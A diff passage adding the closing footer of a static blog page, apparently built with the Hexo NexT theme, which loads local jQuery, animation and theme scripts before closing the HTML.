+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
